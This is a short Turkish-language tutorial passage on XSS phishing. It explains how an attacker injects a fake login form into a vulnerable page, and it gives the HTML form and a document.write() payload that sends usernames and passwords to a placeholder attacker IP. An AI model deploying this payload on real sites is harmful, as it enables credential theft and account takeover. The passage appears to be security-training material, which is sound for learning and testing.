# Phishing(Kimlik Avı)

Çok yaygın bir diğer XSS saldırısı türü ise kimlik avı saldırısıdır. Kimlik avı saldırıları genellikle kurbanları hassas bilgilerini saldırgana göndermeleri için kandırmak amacıyla meşru görünen bilgileri kullanır. Yaygın bir XSS kimlik avı saldırısı biçimi, oturum açma bilgilerini saldırganın sunucusuna gönderen sahte oturum açma formları enjekte etmek yoluyla olur; bu daha sonra kurban adına oturum açmak ve hesabı ve hassas bilgileri üzerinde kontrol elde etmek için kullanılabilir.

# Giriş Formu Enjeksiyonu

Çalışan bir XSS yükü tanımladığımızda, kimlik avı saldırısına geçebiliriz. Bir XSS kimlik avı saldırısı gerçekleştirmek için, hedeflenen sayfada bir oturum açma formu görüntüleyen bir HTML kodu enjekte etmeliyiz. Bu form, oturum açma bilgilerini dinlediğimiz bir sunucuya göndermelidir, böylece bir kullanıcı oturum açmaya çalıştığında, kimlik bilgilerini alırız.

Basit bir giriş formu için bir HTML kodunu kolayca bulabiliriz veya kendi giriş formumuzu yazabiliriz. Aşağıdaki örnek bir giriş formunu sunmalıdır:

    <h3>devam etmek için giriş yapın</h3>
    <form action=http://bilgilerin gitçeği ıp>
      <input type="username" name="username" placeholder="Username">
      <input type="password" name="password" placeholder="Password">
      <input type="submit" name="submit" value="Login">
    </form>

Savunmasız sayfaya HTML kodu yazmak için, JavaScript işlevini kullanabilir document.write() ve kodumuzun en son hali:

    document.write('<h3>devam etmek için giriş yapın</h3><form action=http://bilgilerin gitçeği ıp><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');

